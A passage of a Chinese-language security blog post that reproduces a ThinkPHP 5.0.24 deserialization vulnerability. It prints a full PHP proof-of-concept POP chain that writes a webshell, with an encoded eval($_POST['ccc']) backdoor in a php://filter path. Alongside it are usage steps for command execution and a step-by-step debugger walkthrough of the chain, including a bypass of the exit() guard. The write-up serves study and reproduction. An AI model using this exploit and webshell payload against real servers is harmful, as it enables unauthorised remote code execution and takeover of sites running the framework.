class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//__destruct</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span>=[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pivot</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="variable">$pivot</span>; <span class="comment">//传入Pivot类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//__toString Model子类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Pivot</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>,<span class="variable">$hasone</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>=<span class="variable">$output</span>; <span class="comment">//$this-&gt;parent等于Output类</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error=<span class="variable">$hasone</span>;   <span class="comment">//$modelRelation=$this-&gt;error</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getModel</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model=<span class="variable">$output</span>; <span class="comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">handle</span> = <span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$memcache</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle=<span class="variable">$memcache</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles=[<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Relation</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query=<span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation=<span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcache</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span> = <span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler=<span class="variable">$file</span>; <span class="comment">//$this-&gt;handler等于File类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [</span><br><span class="line">            &#x27;<span class="title class_">path</span>&#x27;=&gt; &#x27;<span class="title class_">php</span>://<span class="title class_">filter</span>/<span class="title class_">convert</span>.<span class="title class_">iconv</span>.<span class="title class_">utf</span>-8.<span class="title class_">utf</span>-7|<span class="title class_">convert</span>.<span class="title class_">base64</span>-<span class="title class_">decode</span>/<span class="title class_">resource</span>=<span class="title class_">aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g</span>/../<span class="title class_">a</span>.<span class="title class_">php</span>&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">cache_subdir</span>&#x27;=&gt;<span class="title class_">false</span>,</span><br><span class="line">            &#x27;<span class="title class_">prefix</span>&#x27;=&gt;&#x27;&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">data_compress</span>&#x27;=&gt;<span class="title class_">false</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span>=<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$memcache</span>=<span class="keyword">new</span> think\session\driver\<span class="title function_ invoke__">Memcache</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$output</span>=<span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$memcache</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="variable">$hasone</span>=<span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$pivot</span>=<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$output</span>,<span class="variable">$hasone</span>);</span><br><span class="line">    <span class="variable">$windows</span>=<span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="variable">$pivot</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行payload后，会写入两个php文件</p>
+<p>访问第二个<code>a.php3b58a9545013e88c7186db11bb158c44.php</code>文件，POST参数为ccc直接命令执行即可</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709232314618.png"></p>
+<h3 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h3><p>全局搜索<code>__destruct()</code>方法，选择<code>thinkphp\library\think\process\pipes\Windows.php</code></p>
+<p>入口是windows的析构方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708165745246.png"></p>
+<p>继续跟进<code>removeFile()</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708170305125.png"></p>
+<p>存在<code>file_exists()</code>函数检查文件是否存在，而变量filename是字符串（也就是对filename的路径进行查找）</p>
+<p>这里会有对象转换成字符串触发<code>__toString()</code>方法，全局搜索一下</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708175754409.png"></p>
+<p>参考其他师傅的利用链，选择的是Model.php，跟进一下</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180100853.png"></p>
+<p>可以看到调用<code>toJson()</code>方法，继续跟进</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180145356.png"></p>
+<p>这里进行return的时候调用<code>toArray()</code>方法，继续跟进</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708180300230.png"></p>
+<p>前面代码大概就是递归处理模型的关联对象，重点往下看</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708181753930.png"></p>
+<p>首先我们要保证<code>$this→append</code>数组不为空</p>
+<p>其次在遍历数组时，要进入第三个else语句中，需要满足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)    <span class="comment">// 值不为数组</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>) <span class="comment">// 值中不含.</span></span><br></pre></td></tr></table></figure>
+
+<p>进入到else语句后，我们跟进下<code>$relation = Loader::parseName($name, 1, false);</code>的<code>parseName()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240708182922643.png"></p>
+<p>这里的type值为1，然后将下划线分隔的字符串转换为驼峰式命名，并根据 <code>$ucfirst</code> 决定首字母的大小写。</p>
+<p>就是简单对传入参数进行转换，对正常字符串没有影响</p>
+<p>回到Model.php，进入if语句<code>method_exists()</code>判断类方法是否存在</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (method_exists($this, $relation)) &#123;</span><br><span class="line">    $modelRelation = $this-&gt;$relation();</span><br><span class="line">    $value         = $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure>
+
+<p>而这里<code>$relation</code>往前推就是<code>$name</code></p>
+<p>我们在第899行下断点，不难发现<code>$name</code>赋值为getError</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709105211261.png"></p>
+<p>我们搜索一下getError方法，作用就是返回值</p>
+<p>也就是说我们的POC利用的是Model.php存在的类方法<code>getError()</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709110001461.png"></p>
+<p>当if判断为真后，对<code>$modelRelation</code>进行了赋值，在这里是通过<code>$this-&gt;$relation()</code>，也就是<code>$this-&gt;$getError()</code>完成的</p>
+<p>所以返回值可控即<code>$modelRelation</code>可控，我们将其设置为了HasOne对象，至于为什么我们在后面进行分析</p>
+<hr>
+<p>我们继续往下看，是否<code>$value</code>也可控</p>
+<p>跟进一下<code>getRelationData()</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709111217400.png"></p>
+<p>注意这里的if语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure>
+
+<p>如果为真则执行<code>$value = $this-&gt;parent;</code>也就是<code>$value</code>由<code>$parent</code>决定</p>
+<p>那么需要满足if三个条件</p>
+<ul>
+<li><code>$this-&gt;parent</code></li>
+<li><code>!$modelRelation-&gt;isSelfRelation()</code></li>
+<li><code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent))</code></li>
+</ul>
+<p><strong>第一个条件</strong></p>
+<p>我们一个个看，先在902行下断点，调试发现</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709112137562.png"></p>
+<p>POC将<code>$parent</code>指向的是<code>think\console\Output</code>类，之所以选择<code>think\console\Output</code>类是因为这是我们找到其存在合适的<code>__call()</code>方法，存在<code>call_user_func_array</code>函数可以进一步getshell</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709135401749.png"></p>
+<p>回到Model.php，那么我们在最后执行的时候，让<code>$value</code>指向该类就可以触发<code>__call()</code>方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二个条件</strong></p>
+<p>我们跟进一下<code>isSelfRelation()</code>，注意到是返回<code>$selfRelation</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709140708127.png"></p>
+<p>我们如何让<code>!$modelRelation-&gt;isSelfRelation()</code>成立呢</p>
+<p>我们前面提到了将<code>$modelRelation</code>设置为了HasOne对象，我们跟进一下</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709135839727.png"></p>
+<p>HasOne类是OneToOne类的子类，而OneToOne类是抽象类无法生成实例</p>
+<p>不过发现OneToOne类又是Relation类的子类</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709140447139.png"></p>
+<p>所以<code>$selfRelation</code>可控，那么我们将其设为false即可</p>
+<p>也就是POC中HasOne类对<code>$selfRelation</code>赋值，然后<code>isSelfRelation()</code>为false使得第二个条件成立</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query=<span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation=<span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三个条件</strong></p>
+<p>这里要求返回的对象的类名相同</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>))</span><br></pre></td></tr></table></figure>
+
+<p><code>$modelRelation-&gt;getModel()</code>就指的是<code>Hasone::getModel()</code>，因为Hasone类是Relation类的子类，当然继承它的<code>getModel()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143002495.png"></p>
+<p>这里按住ctrl点击跟进，到<code>thinkphp\library\think\db\Query.php</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143112732.png"></p>
+<p>所以左侧get_class获得的类名由<code>$model</code>决定，而右边我们前面也分析过<code>$parent</code>指向output类</p>
+<p>所以我们只需要让<code>$model</code>的值为output对象即可</p>
+<p>当然<code>$query</code>也要指向<code>thinkphp\library\think\db\Query.php</code>的<code>getModel()</code></p>
+<hr>
+<p><code>$modelRelation</code>和<code>$value</code>分析完后我们继续往下看</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709143822708.png"></p>
+<p>if语句判断是否存在<code>getBindAttr()</code>类方法</p>
+<p>虽然HasOne类并没有，不过它继承了父类的<code>getBindAttr()</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709144029570.png"></p>
+<p>所以if为真，执行<code>$bindAttr = $modelRelation-&gt;getBindAttr();</code></p>
+<p>不过要注意<code>$bindAttr</code>定义的时候是<code>protected $bindAttr = [];</code>也就是数组格式</p>
+<p>我们在第904行下断点，可以发现赋值<code>$bindAttr=[&#39;a&#39;=&gt;&#39;admin&#39;];</code></p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709145124298.png"></p>
+<p>赋值后到第二个if语句，很明显if为真，然后遍历<code>$bindAttr</code>赋值给<code>$key =&gt; $attr</code>，因为<code>$key=a</code>所以保持不变。继续到第三个if语句，<code>$data</code>不存在a键名所以执行else语句，<code>$value</code>为真执行<code>$value-&gt;getAttr($attr)</code>触发<code>__call()</code>方法</p>
+<blockquote>
+<p>为什么可以触发<code>__call()</code>方法我们再理一下思路，<code>$value</code>是由<code>$parent</code>决定并且可控，前面提到我们将<code>$parent</code>指向Output类的，而Output类不存在getAttr()方法，所以就触发Output类的<code>__call()</code>方法达成我们目的</p>
+</blockquote>
+<p>继续跟进到<code>__call()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709164150929.png"></p>
+<p>判断<code>$method</code>是否在<code>$styles</code>数组里，如果if为真执行<code>array_unshift($args, $method);</code></p>
+<p>把<code>$method</code>拼接到<code>$args</code>数组的头部，我们可以下断点看看</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709170952503.png"></p>
+<p>然后return执行<code>call_user_func_array()</code>函数调用block方法，跟进一下</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709171130568.png"></p>
+<p>调用<code>writeIn()</code>方法，参数为<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，这是上面2个变量拼贴来的</p>
+<p>跟进<code>writeIn()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709172014994.png"></p>
+<p>调用<code>write()</code>方法，参数为<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，另外两个分别为<code>true,0</code></p>
+<p>继续跟进<code>write()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709172137434.png"></p>
+<p>这里最终还是调用<code>write()</code>方法，我们全局搜索一下。最终在<code>thinkphp\library\think\session\driver</code>路径下找到<code>Memcache.php</code>和<code>Memcached.php</code>存在利用点。不过这俩文件还是有点区别，在建立连接的时候<code>Memcached.php</code>使用<code>setSaslAuthData()</code>对身份进行认证</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709173740127.png"></p>
+<p>因此我们选择利用<code>thinkphp\library\think\session\driver\Memcache.php</code></p>
+<p>那么我们前面<code>write()</code>的handle指向Memcache类就行</p>
+<blockquote>
+<p>注：这里handle指向Memcached类也行，前面一通分析其实跟身份验证没啥关系，因为那是打开session的时候做的事，我们调用的<code>write()</code>方法是在写入session的时候做的，所以不管哪个类都能写webshell</p>
+</blockquote>
+<p>跟进到Memcache.php的<code>write()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709182751369.png"></p>
+<p>调用set方法，全局搜索一下找到<code>thinkphp\library\think\cache\driver\File.php</code>存在<code>file_put_contents()</code></p>
+<p>可以写入文件，跟进一下发现存在死亡<code>exit()</code>，用base64编码绕过</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709182927457.png"></p>
+<p>我们先看<code>$filename</code>是如何赋值的，跟进<code>getCacheKey()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709194521983.png"></p>
+<p>这里我们对<code>cache_subdir</code>和<code>prefix</code>进行赋值，然后跳过前面两个if语句到最后进行拼接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = $this-&gt;options[&#x27;path&#x27;] . $name . &#x27;.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>我们在第72行下断点，调试发现<code>$name</code>的值为前面出现过的<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code></p>
+<p>对<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>进行MD5加密后，与<code>$this-&gt;options[&#39;path&#39;]</code>和<code>.php</code>进行拼接</p>
+<p>得到<code>$filename</code>为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然这里文件名可控，但是<code>$data</code>并不可控（<code>$value</code>值为true），也就是说即使创建了文件也不是我们的马</p>
+<p>回到<code>set()</code>方法继续往下看，跟进<code>setTagItem()</code>方法</p>
+<p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20240709225558456.png"></p>
+<p>我们赋值tag为1，然后<code>$key</code>为tag拼接MD5加密过的字符1，由于<code>$key</code>缓存并不存在所以执行else语句</p>
+<p><code>$name</code>赋值给<code>$value</code>，然后再次调用<code>set()</code>方法</p>
+<blockquote>
+<p>这里再次调用该方法后，传递的<code>$value</code>和<code>$name</code>的值是一样的，我们可以看看到底发生了什么变化</p>
+</blockquote>
+<p>对于<code>file_put_contents($filename, $data);</code>中的<code>$filename</code>来说还是不变</p>
+<p>而<code>$data</code>我们可以在第159行下断点看看，发现经过拼接后变成如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//000000000000</span><br><span class="line"> exit();?&gt;</span><br><span class="line">s:158:&quot;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php63ac11a7699c5c57d85009296440d77a.php&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>我们注意到存在和<code>$filename</code>一样的值，这也是绕过死亡函数的变种</p>
+<p>类似于如下形式，具体绕过原理就不再赘述</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这个写的第二个文件就是我们实现RCE的马，所以其实整个过程是写了两个php文件</p>
+<p>写的路径就在根路径下，shell文件名为<code>a.php+md5(tag_c4ca4238a0b923820dcc509a6f75849b)+.php</code></p>
+<p>以上就是整个POP链的调用分析</p>
+<hr>
+<h3 id="POP链调用过程图"><a href="#POP链调用过程图" class="headerlink" title="POP链调用过程图"></a>POP链调用过程图</h3><p><img src="/article/ThinkPHP5-0-24-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20221011115008-ccb4a1ce-4917-1.png"></p>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于初学者来说，审这么又臭又长的代码确实是件非常具有挑战的事。除了本文讲到的前置知识和开发手册的内容外，还需要对反序列化基本概念非常了解以及绕过死亡函数的变种形式等等。以后有时间也会继续复现tp框架的其他漏洞。</p>
+<hr>
